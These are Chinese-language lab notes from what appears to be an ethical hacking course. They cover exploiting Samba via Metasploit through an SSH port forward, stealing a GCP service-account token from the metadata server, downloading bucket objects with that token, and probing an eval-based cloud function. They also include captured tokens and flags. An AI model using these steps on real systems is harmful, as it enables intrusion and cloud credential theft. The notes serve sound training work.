nmap 10.0.6.133 -sV -p 139,445 --script=smb-vuln-cve-2017-7494 --script-args=smb-vuln-cve-2017-7494.check-version
也就是告诉你vulnerable

开始搜索可以用的模块
```
msf6 > search exploit/windows/smb/ and shell

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/windows/smb/smb_relay                         2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   1  exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   2  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  exploit/windows/smb/psexec                            1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   4  exploit/windows/smb/ms10_046_shortcut_icon_dllloader  2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   5  exploit/windows/smb/ms15_020_shortcut_icon_dllloader  2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
   6  exploit/windows/smb/smb_delivery                      2016-07-26       excellent  No     SMB Delivery

msf6 > search exploit/linux/samba/

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/samba/setinfopolicy_heap   2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   1  exploit/linux/samba/chain_reply          2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   2  exploit/linux/samba/is_known_pipename    2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   3  exploit/linux/samba/lsa_transnames_heap  2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   4  exploit/linux/samba/trans2open           2003-04-07       great      No     Samba trans2open Overflow (Linux x86)

```


### 远程端口转发

需要在kali上建立ssh服务器
┌──(kali㉿kali)-[~/.ssh]
└─$ sudo mkdir /run/sshd    
┌──(kali㉿kali)-[~/.ssh]
└─$ sudo /usr/sbin/sshd -f /etc/ssh/sshd_config -d

远程转发在中介机器上运行：
lord_nikon@en2720-w11-buckeye:~/.ssh$ nc 192.168.0.7 > buck
lord_nikon@en2720-w11-buckeye:~/.ssh$ chmod 600 buck
lord_nikon@en2720-w11-buckeye:~/.ssh$ ssh -R 4444:10.0.6.133:445 kali@192.168.0.7 -i buck

然后再运行攻击模块
┌──(kali㉿kali)-[~/.ssh]
└─$ msfconsole
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(linux/samba/is_known_pipename) > set RPORT 4444
RPORT => 4444

然后就可以run了

- 继续发现10.0.6.133:52961也是开着的
注意公钥生效必须要配置权限！
chmod 700 /home/skyler/.ssh
chmod 600 /home/skyler/.ssh/authorized_keys


### 本地端口转发，稳定ssh？
10.0.2.239
```
goldstein@en2720-w11-sea-turtle:~$ nmap localhost -p1-65535

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-08 15:52 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 15:52 (0:00:00 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000082s latency).
rDNS record for 127.0.0.1: localhost.localdomain
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
52961/tcp open  unknown

goldstein@en2720-w11-sea-turtle:~/.ssh$ ssh-keygen
goldstein@en2720-w11-sea-turtle:~/.ssh$ cat goldstein.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrPGqIC5f1iY7zwVB/GLr1N7GwQ+LJjAV8gp/lZmLfoG6JMxPLg2teYo/0EqVjkXjillDycK1UYQPzNSIEy9ZKpCuEAaFIZmhtffP+fG9xH9Im9Ks3JiMoqlvY+LwGkuGAm/byCwWa8dMOA1jv3jEswGU3DK7QVD5u1mLHRcuDocxDmgRxMV5R5beIARchy1SdpX6SoADCR669GrGjx7hDXoUr+wLEU9PZ1dqH3pTRhKrXw830Cz3iinnB04shztJTD13JNKHDdOlp2h6ZZi831fR1vwPklfbh44+XqGOlYDDHLZn3JifiuhNs+Dwy6yidfee9EO9nXkulsjBsVyIr goldstein@en2720-w11-sea-turtle

root@en2720-w11-sea-turtle:~/.ssh# cat c_id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrVwVoawJ5h35vuCgDigZ2CztlJ2Ut1PKHjszB8kA5ZdscZedRC0KsksM2vvmDiCprfQPKYno93JfRnfSFuzsw1pLdVvLmSsA24EjkwqEppsJqzMOD5XLb8Ejq6cIMcykR5aXrv6jqtjzJprEoAVeKf30uqXm+AqTdMIHR6whZRVDZdgPHTP+c7uYjtTDFP+7iWohTelrSpeMITtU2PZxzAr+XoYz8dBYaOHV2PaBtUchuL13DzTWAaWG8j09UeSBJX20IFEEdMi8ECXlldE717T4aRFkgjtyOvUZEfv7852JLqXKSCxOCadsrslHo6wawI1BemBLkMW7abuQc+vH7bn8pzYpSU62skJAIdOSF4OoLZGTxIE/bF2CsXnavoAT0XkAeZnZ2Sq5AGTrR6KB7usmXjrOXXUkOszp3emCE21wEgrjMe4CMxkt4Y/PfEeHs6h2PtTQq3boiU2i0MXOyba5FjZ8dVMvm++jkvVOrs9jVMX0kJSYyDZYQcE0zBqU= kali@kali

```

本地转发，kali执行：
ssh -L 9993:10.0.6.168:21 lord_nikon@10.0.7.6 -p 52961 -o StrictHostKeyChecking=no
ftp localhost:9993
> 虽然还是不能用这个ftp。总结就是本地转发并不行！

## Google Cloud: Git

### 查询虚拟机元数据
https://cloud.google.com/compute/docs/metadata/querying-metadata

获知目录的方法：
1. 在url末尾打上“/”相当于运行ls哈哈哈
2. 让url末尾变成/?recursive=true

```
root@en2720-w11-cloud-hopper:~/.7# curl "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" -H "Metadata-Flavor: Google"
{
  "attributes":{"bucket":"en2720-w11-7a411381794a43e8c206623dc23a5596db159d99","sourcerepo":"twmn_sourcerepo_en2720-w11"},
  "cpuPlatform":"Intel Broadwell",
  "description":"",
  "disks":[{"deviceName":"persistent-disk-0","index":0,"interface":"SCSI","mode":"READ_WRITE","type":"PERSISTENT"}],
  "guestAttributes":{},"hostname":"en2720-w11-cloud-hopper.c.en2720-2017.internal","id":769061782125350184,"image":"",
  "licenses":[{"id":"5926592092274602096"}],
  "machineType":"projects/190704744818/machineTypes/e2-micro",
  "maintenanceEvent":"NONE",
  "name":"en2720-w11-cloud-hopper",
  "networkInterfaces":[{"accessConfigs":[{"externalIp":"35.210.40.111","type":"ONE_TO_ONE_NAT"}],
  "dnsServers":["169.254.169.254"],
  "forwardedIps":[],
  "gateway":"10.37.148.1",
  "ip":"10.37.150.133",
  "ipAliases":[],
  "mac":"42:01:0a:25:96:85",
  "mtu":1500,
  "network":"projects/190704744818/networks/en2720-w11",
  "subnetmask":"255.255.252.0",
  "targetInstanceIps":[]}],
  "preempted":"FALSE",
  "remainingCpuTime":-1,
  "scheduling":{"automaticRestart":"TRUE","onHostMaintenance":"MIGRATE","preemptible":"FALSE"},
  "serviceAccounts":{"default":{"aliases":["default"],"email":"en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]},"en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com":{"aliases":["default"],"email":"en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]}},
  "tags":["cloud-hopper","hidden-net","linux"],
  "virtualClock":{"driftToken":"0"},
  "zone":"projects/190704744818/zones/europe-west1-b"
}
root@en2720-w11-cloud-hopper:~# curl "http://metadata.google.internal/computeMetadata/v1/project/" -H "Metadata-Flavor: Google"

root@en2720-w11-cloud-hopper:~# curl "http://metadata.google.internal/computeMetadata/v1/project/?recursive=true" -H "Metadata-Flavor: Google"
{"attributes":{"enable-oslogin":"TRUE","gke-earth-k8s-1-ae273f75-secondary-ranges":"services:earth:earth-slussen:gke-earth-k8s-1-services-ae273f75,pods:earth:earth-slussen:gke-earth-k8s-1-pods-ae273f75","google-compute-default-region":"europe-west1","google-compute-default-zone":"europe-west1-b","serial-port-enable":"TRUE","ssh-keys":"nikos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWU9OYL11s1VTOPuO1sA42lExjyh2SLzl/Svni51VPqQjDVZrFG0s7585UidmYXlFpiJYGSdatm2BdT+p6iWcm/ceULofiIyYp/2jlbqzPfzuOT49PGoEwTnx4RnsZSrRG71Oht4KKHQEZUBC1HzzqcX7TIRujob519S9z82WspxKPclJEKP4TuONISbBkp3wrX3udaFkYREH1jQvYcS17gAWaOYUt6oKo8hkUEzvr8TgReUHz9ja8R4GTMFrwMkG/7M0LnoGXIzvvei4h+EOdpVFbYx3PejefGnhhjRTO1sclfGtF/lcKtV5I/l9CJT5SDptf8v4pbfV+1AAKBMrITa8Ylng3FZ3dFg3krKRg9mZ2PJ/OZuWsNISsILD6BTaUoNurdZK2celYW7ZaG7TM8AkzGdwCj8DRAD80jZ7BpsGtuy1U9JzNDbYcv9Ca09xvBxylJIqg4z8vpj5LctjZKG6BCqan2BVPbm7Y/bSjgg/cGRth9RsHQZozidkOhPE= nikos@nikoss-air\ntestuser:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJxFNhUB53+osnAxEjycD7vnnHgkhP03KUzybZQFHafbWG8e5363fitmNh4S8WW5vcCfsUSe1HwuGm6C4bOZNpLAV7TxObf4V2/4cyy5se7F3CYFvRVkhYxx1lU+Jy/msNFbCC/JT1AKLnUxaMAODAs4pMB8n5Xo5rPv85+XgJGTi8tEzfKsYQMP7qcTMR8FI0Xd/+rHnwHGvgGutdeHiIFW9CMj9wYaHb/2EASdZTvEGFcO/l3LxKvJqfK3AfVYkfc8d9gw0GnGdljq1LWBcx5IGoaAsTz/W4ytNVY8AbQJJ1/4NlRsjsc/9BEbxDzaxVY67KMIs28zSvgbWodOOq6ui6CfOUyvaPmwUg2jZGrVr2tQdzOKFPe3ivpSnHDQgDFKmNNSrBb90KcU6d/6HWcGd32rJ2ZxrzFsRRHQghkjVdXk6O6+LWgGfIVso2WNxjWnauvbS/iU0OIHVdJqOr16DlpHG18NXgyzOjNYOFsFV6tzEN+5dipGCdRD7fCGE= nikos@earth-nikolaos\ntestuser2:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJxFNhUB53+osnAxEjycD7vnnHgkhP03KUzybZQFHafbWG8e5363fitmNh4S8WW5vcCfsUSe1HwuGm6C4bOZNpLAV7TxObf4V2/4cyy5se7F3CYFvRVkhYxx1lU+Jy/msNFbCC/JT1AKLnUxaMAODAs4pMB8n5Xo5rPv85+XgJGTi8tEzfKsYQMP7qcTMR8FI0Xd/+rHnwHGvgGutdeHiIFW9CMj9wYaHb/2EASdZTvEGFcO/l3LxKvJqfK3AfVYkfc8d9gw0GnGdljq1LWBcx5IGoaAsTz/W4ytNVY8AbQJJ1/4NlRsjsc/9BEbxDzaxVY67KMIs28zSvgbWodOOq6ui6CfOUyvaPmwUg2jZGrVr2tQdzOKFPe3ivpSnHDQgDFKmNNSrBb90KcU6d/6HWcGd32rJ2ZxrzFsRRHQghkjVdXk6O6+LWgGfIVso2WNxjWnauvbS/iU0OIHVdJqOr16DlpHG18NXgyzOjNYOFsFV6tzEN+5dipGCdRD7fCGE= nikos@earth-nikolaos\ntestuser3:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJxFNhUB53+osnAxEjycD7vnnHgkhP03KUzybZQFHafbWG8e5363fitmNh4S8WW5vcCfsUSe1HwuGm6C4bOZNpLAV7TxObf4V2/4cyy5se7F3CYFvRVkhYxx1lU+Jy/msNFbCC/JT1AKLnUxaMAODAs4pMB8n5Xo5rPv85+XgJGTi8tEzfKsYQMP7qcTMR8FI0Xd/+rHnwHGvgGutdeHiIFW9CMj9wYaHb/2EASdZTvEGFcO/l3LxKvJqfK3AfVYkfc8d9gw0GnGdljq1LWBcx5IGoaAsTz/W4ytNVY8AbQJJ1/4NlRsjsc/9BEbxDzaxVY67KMIs28zSvgbWodOOq6ui6CfOUyvaPmwUg2jZGrVr2tQdzOKFPe3ivpSnHDQgDFKmNNSrBb90KcU6d/6HWcGd32rJ2ZxrzFsRRHQghkjVdXk6O6+LWgGfIVso2WNxjWnauvbS/iU0OIHVdJqOr16DlpHG18NXgyzOjNYOFsFV6tzEN+5dipGCdRD7fCGE= nikos@earth-nikolaos\nnikos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJxFNhUB53+osnAxEjycD7vnnHgkhP03KUzybZQFHafbWG8e5363fitmNh4S8WW5vcCfsUSe1HwuGm6C4bOZNpLAV7TxObf4V2/4cyy5se7F3CYFvRVkhYxx1lU+Jy/msNFbCC/JT1AKLnUxaMAODAs4pMB8n5Xo5rPv85+XgJGTi8tEzfKsYQMP7qcTMR8FI0Xd/+rHnwHGvgGutdeHiIFW9CMj9wYaHb/2EASdZTvEGFcO/l3LxKvJqfK3AfVYkfc8d9gw0GnGdljq1LWBcx5IGoaAsTz/W4ytNVY8AbQJJ1/4NlRsjsc/9BEbxDzaxVY67KMIs28zSvgbWodOOq6ui6CfOUyvaPmwUg2jZGrVr2tQdzOKFPe3ivpSnHDQgDFKmNNSrBb90KcU6d/6HWcGd32rJ2ZxrzFsRRHQghkjVdXk6O6+LWgGfIVso2WNxjWnauvbS/iU0OIHVdJqOr16DlpHG18NXgyzOjNYOFsFV6tzEN+5dipGCdRD7fCGE= nikos@earth-nikolaos"},"numericProjectId":190704744818,"projectId":"en2720-2017"}
```
### Git & gcloud
得到信息，这是一个git仓库，repo:twmn_sourcerepo_en2720-w11, project:en2720-2017
根据https://cloud.google.com/source-repositories/docs/cloning-repositories#gcloud_1可以知道怎么克隆：
gcloud source repos clone [REPO_NAME] --project=[PROJECT_NAME]
```
root@en2720-w11-cloud-hopper:~/.7# gcloud source repos clone twmn_sourcerepo_en2720-w11 en2720-2017
ERROR: (gcloud.source.repos.clone) PERMISSION_DENIED: The caller does not have permission
- '@type': type.googleapis.com/google.rpc.RequestInfo
  requestId: e047a0f3cb0c43f389d8040883cf69a8
```

尴尬了。但是奇怪地解决了，记录一下玄学过程：
```
root@en2720-w11-cloud-hopper:~/.7# gcloud source repos clone twmn_sourcerepo_en2720-w11 en2720-2017
ERROR: (gcloud.source.repos.clone) Your current active account [dummy-850@en2720-2017.iam.gserviceaccount.com] does not have any valid credentials
Please run:

  $ gcloud auth login

to obtain new credentials.

For service account, please activate it first:

  $ gcloud auth activate-service-account ACCOUNT
root@en2720-w11-cloud-hopper:~/.7# gcloud auth login

You are running on a Google Compute Engine virtual machine.
It is recommended that you use service accounts for authentication.

You can run:

  $ gcloud config set account `ACCOUNT`

to switch accounts if necessary.

Your credentials may be visible to others with access to this
virtual machine. Are you sure you want to authenticate with
your personal account?

Do you want to continue (Y/n)?  y

Go to the following link in your browser:

    https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsdk.cloud.google.com%2Fauthcode.html&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AV5F47DAn5IzozL8q7dwoYfX4MG6Ex&prompt=consent&access_type=offline&code_challenge=M7xag4d4NYTFgLHYvr6Z6JgglPXuvl3XCrm-AVfLYlg&code_challenge_method=S256

Enter authorization code: ^C

Command killed by keyboard interrupt


root@en2720-w11-cloud-hopper:~/.7# gcloud source repos clone twmn_sourcerepo_en2720-w11 en2720-2017
ERROR: (gcloud.source.repos.clone) Your current active account [dummy-850@en2720-2017.iam.gserviceaccount.com] does not have any valid credentials
Please run:

  $ gcloud auth login

to obtain new credentials.

For service account, please activate it first:

  $ gcloud auth activate-service-account ACCOUNT
root@en2720-w11-cloud-hopper:~/.7# gcloud init
Welcome! This command will take you through the configuration of gcloud.

Settings from your current configuration [default] are:
core:
  account: dummy-850@en2720-2017.iam.gserviceaccount.com
  disable_usage_reporting: 'True'
  project: en2720-2017

Pick configuration to use:
 [1] Re-initialize this configuration [default] with new settings 
 [2] Create a new configuration
Please enter your numeric choice:  1

Your current configuration has been set to: [default]

You can skip diagnostics next time by using the following flag:
  gcloud init --skip-diagnostics

Network diagnostic detects and fixes local network connection issues.
Checking network connection...done.                                                                         
Reachability Check passed.
Network diagnostic passed (1/1 checks passed).

Choose the account you would like to use to perform operations for this configuration:
 [1] en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com
 [2] Log in with a new account
Please enter your numeric choice:  1

You are logged in as: [en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com].

This account has no projects.

Would you like to create one? (Y/n)?  n

root@en2720-w11-cloud-hopper:~/.7# gcloud source repos clone twmn_sourcerepo_en2720-w11 en2720-2017
Cloning into '/root/.7/en2720-2017'...
remote: Total 16 (delta 4), reused 16 (delta 4)
Unpacking objects: 100% (16/16), done.
Project [en2720-2017] repository [twmn_sourcerepo_en2720-w11] was cloned to [/root/.7/en2720-2017].
```

```
git clone https://source.developers.google.com/p/[PROJECT_NAME]/r/[REPO_NAME]

git clone https://source.developers.google.com/p/en2720-2017/r/twmn_sourcerepo_en2720-w11

```

我用了`git log -p`看到flag。官方用git rev-list --all。

## Google Cloud

### gcloud操作
https://cloud.google.com/storage/docs/downloading-objects
```shell
root@en2720-w11-cloud-hopper:~# gcloud storage ls --recursive gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/**
gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/flag{21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d}.jpg
gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/googlecloudfunction.spec
gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/wifi-ssh-key
gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/wifi-ssh-key.pub

root@en2720-w11-cloud-hopper:~# gcloud storage cp --recursive gs://en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/**
ERROR: gcloud crashed (ValueError): Must have URL arguments if not reading paths from stdin.

If you would like to report this issue, please run the following command:
  gcloud feedback

To check gcloud for common problems, please run the following command:
  gcloud info --run-diagnostics
```

其实这里就知道flag名字了，但是不能下载。

### 获取token
```shell
root@en2720-w11-cloud-hopper:~# curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true" -H "Metadata-Flavor: Google"
{
  "default":
  {
    "aliases":["default"],
    "email":"en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com",
    "scopes":["https://www.googleapis.com/auth/cloud-platform"]
  },
  "en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com":
  {
    "aliases":["default"],
    "email":"en2720-w11-cloud-hopper@en2720-2017.iam.gserviceaccount.com",
    "scopes":["https://www.googleapis.com/auth/cloud-platform"]
  }
}
```

**注意上面用recursive并没有显示出token的存在**

```shell
root@en2720-w11-cloud-hopper:~# curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
{"access_token":"ya29.c.b0AUFJQsHfs0apjM6CmQfnvnh8syeytOEqfy550BXtT9_Xma2Iu0oYGoeVXkgWrhE8DWBe4NZoAEZfZrAExD8CAG8TItNgJoEIdbKjHT0z1b_BV8zeZsUjbQygzxfKif0UOBtftm2Mt-SmteUph9MB-k67j_4a0V6JatVjOAkrsd8AyHt276k8S_zzKGUbJoNbiQq6Eca8sQ.............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................","expires_in":3373,"token_type":"Bearer"}
```


### curl带token
```
BUCKET=en2720-w11-7a411381794a43e8c206623dc23a5596db159d99
TOKEN=上面那串 包括所有点

root@en2720-w11-cloud-hopper:~# curl "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/?project=en2720-2017" -H "Authorization: Bearer $TOKEN"
{
  "kind": "storage#objects",
  "items": [
    {
      "kind": "storage#object",
      "id": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/flag{21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d}.jpg/1665621053239775",
      "selfLink": "https://www.googleapis.com/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/flag%7B21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d%7D.jpg",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/flag%7B21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d%7D.jpg?generation=1665621053239775&alt=media",
      "name": "flag{21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d}.jpg",
      "bucket": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99",
      "generation": "1665621053239775",
      "metageneration": "1",
      "contentType": "image/jpeg",
      "storageClass": "REGIONAL",
      "size": "57793",
      "md5Hash": "Ww7VIKfXciJtiYTrKOk/HQ==",
      "crc32c": "7A5a8Q==",
      "etag": "CN/j1fn52/oCEAE=",
      "timeCreated": "2022-10-13T00:30:53.242Z",
      "updated": "2022-10-13T00:30:53.242Z",
      "timeStorageClassUpdated": "2022-10-13T00:30:53.242Z"
    },
    {
      "kind": "storage#object",
      "id": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/googlecloudfunction.spec/1662354588498105",
      "selfLink": "https://www.googleapis.com/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/googlecloudfunction.spec",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/googlecloudfunction.spec?generation=1662354588498105&alt=media",
      "name": "googlecloudfunction.spec",
      "bucket": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99",
      "generation": "1662354588498105",
      "metageneration": "1",
      "contentType": "application/octet-stream",
      "storageClass": "REGIONAL",
      "size": "400",
      "md5Hash": "m7SiDPun94ufQ0TIUW+w6Q==",
      "crc32c": "XlnGnQ==",
      "etag": "CLnx87Xx/PkCEAE=",
      "timeCreated": "2022-09-05T05:09:48.508Z",
      "updated": "2022-09-05T05:09:48.508Z",
      "timeStorageClassUpdated": "2022-09-05T05:09:48.508Z"
    },
    {
      "kind": "storage#object",
      "id": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/wifi-ssh-key/1662354585396728",
      "selfLink": "https://www.googleapis.com/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/wifi-ssh-key",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/wifi-ssh-key?generation=1662354585396728&alt=media",
      "name": "wifi-ssh-key",
      "bucket": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99",
      "generation": "1662354585396728",
      "metageneration": "1",
      "contentType": "application/octet-stream",
      "storageClass": "REGIONAL",
      "size": "3243",
      "md5Hash": "a68Gh1NfBXoXwl8nyqLyiA==",
      "crc32c": "VU9f3A==",
      "etag": "CPjLtrTx/PkCEAE=",
      "timeCreated": "2022-09-05T05:09:45.405Z",
      "updated": "2022-09-05T05:09:45.405Z",
      "timeStorageClassUpdated": "2022-09-05T05:09:45.405Z"
    },
    {
      "kind": "storage#object",
      "id": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/wifi-ssh-key.pub/1662354586961113",
      "selfLink": "https://www.googleapis.com/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/wifi-ssh-key.pub",
      "mediaLink": "https://storage.googleapis.com/download/storage/v1/b/en2720-w11-7a411381794a43e8c206623dc23a5596db159d99/o/wifi-ssh-key.pub?generation=1662354586961113&alt=media",
      "name": "wifi-ssh-key.pub",
      "bucket": "en2720-w11-7a411381794a43e8c206623dc23a5596db159d99",
      "generation": "1662354586961113",
      "metageneration": "1",
      "contentType": "application/octet-stream",
      "storageClass": "REGIONAL",
      "size": "748",
      "md5Hash": "lDUzvH/XVCvvud6JKz4qYQ==",
      "crc32c": "7btTEQ==",
      "etag": "CNmJlrXx/PkCEAE=",
      "timeCreated": "2022-09-05T05:09:46.968Z",
      "updated": "2022-09-05T05:09:46.968Z",
      "timeStorageClassUpdated": "2022-09-05T05:09:46.968Z"
    }
  ]
}
```
**这里有奇怪的地方，有时候会401错误，可能跟时间有关**

使用alt=media参数可以下载：
```
curl "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/<object>?project=en2720-2017&alt=media" -H "Authorization: Bearer $TOKEN"
curl "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/flag%7B21077e6b115139f405c3f7d6f7a63f2a5e3433267e703d%7D.jpg?project=en2720-2017&alt=media" -H "Authorization: Bearer $TOKEN"
```

## Google Cloud: Cloud hacking

### 代码审计
两个版本的差别是debugFunction，其中用到了eval函数。
hint中也提到了eval函数。看看它是什么：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval

根据提示应该可以用来查询环境变量。


### 云函数调用-HTTP curl
projects/en2720-2017/locations/europe-west1/functions/twmn_cloud_hack_en2720-w11

手动生成令牌：https://cloud.google.com/functions/docs/securing/authenticating
```
root@en2720-w11-cloud-hopper:~/.7# AUDIENCE=https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11
root@en2720-w11-cloud-hopper:~/.7# curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=$AUDIENCE" -H "Metadata-Flavor: Google"
eyJhbGciOiJSUzI1NiIsImtpZCI6Ijk1NTEwNGEzN2ZhOTAzZWQ4MGM1NzE0NWVjOWU4M2VkYjI5YjBjNDUiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJodHRwczovL2V1cm9wZS13ZXN0MS1lbjI3MjAtMjAxNy5jbG91ZGZ1bmN0aW9ucy5uZXQvdHdtbl9jbG91ZF9oYWNrX2VuMjcyMC13MTEiLCJhenAiOiIxMTA5MDQyOTE2MjAyNjkxMDY0NDYiLCJleHAiOjE2NjU3MDU3MjIsImlhdCI6MTY2NTcwMjEyMiwiaXNzIjoiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tIiwic3ViIjoiMTEwOTA0MjkxNjIwMjY5MTA2NDQ2In0.rxrx6FEOmU0gL6k-SVNYJbKjFr-0akSTQ8hOwm6qB2kcT3G9fecHziM_Kd5yZJbXLF9CX5_jjACEPW2cXCTVSIjI-IieFhmlSUbHWGk80CzPoauF2PysP3E1qU8KeuF18yvaElWgHtikqj0zXrZ0zJJuIJ1cYR7nerCxUVX8eqc_u2Oj_IwBZPPzn_2O3CP-G1GAHa4W-kuUOBO1d2YQRhVHe_vLjob5oCVcJAv5gONcUf-v1aQrJ-y2mw-QQDPyFtSlM7576dNHosF2ZRra6_TaAch2DffYOwmZffVav3TRP4ktp1jONLhzob07hfp5uwKPkX3ZUb7VUB_euGbRcQ
```

这个令牌有时限。通过[https://jwt.io/]进行解析上述json对象：
{
  "alg": "RS256",
  "kid": "955104a37fa903ed80c57145ec9e83edb29b0c45",
  "typ": "JWT"
}
{
  "aud": "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11",
  "azp": "110904291620269106446",
  "exp": 1665705722,
  "iat": 1665702122,
  "iss": "https://accounts.google.com",
  "sub": "110904291620269106446"
}
这些参数的说明可以看：https://www.rfc-editor.org/rfc/rfc7519#section-4.1

使用上面生成的这个作为token，可以调用函数！函数名可以在那个googlecloudfunction.spec里找到。

root@en2720-w11-cloud-hopper:~/.7# curl  "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11" -H "Authorization: Bearer $TOKEN" 
{"from":"Ethical Hacking Function","message":"Hello, I am a cloud function."}

### 云函数调用-gcloud(搁置，通不过认证)
首先身份验证：https://cloud.google.com/functions/docs/securing/authenticating
curl  -H "Authorization: bearer $(gcloud auth print-identity-token) " https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11

YOUR_FUNCTION_REGION=europe-west1
YOUR_FUNCTION_NAME=twmn_cloud_hack_en2720-w11
gcloud functions describe $YOUR_FUNCTION_NAME \
--gen2 \
--region=$YOUR_FUNCTION_REGION \
--format="value(serviceConfig.uri)" \
--allow-unauthenticated 

gcloud functions describe $YOUR_FUNCTION_NAME --gen2 --region=europe-west1 --format="value(serviceConfig.uri)"

### 环境变量
思路是为了运行debugFunction，需要配置某些参数。看代码里面选择语句的判断条件，跟debug和message有关。要让debug=process.env.PASSWORD，message=某个命令。

问题在于debugFunction里面那个判断message是否object类型的句子怎么也不能跳过，带上“{}”也不是object。最后发现只要直接把某个object对象的名字填进去，就会判断成object类型了。

总之就是试。

```shell
# GET
root@en2720-w11-cloud-hopper:~/.7# curl "https://europe-west1-en2720-2017.cloudfunctions.net/twmn_cloud_hack_en2720-w11?debug=1&message=1" -H "Authorization: Bearer $TOKEN"
{"from":"Ethical Hacking Function","message":"1"}

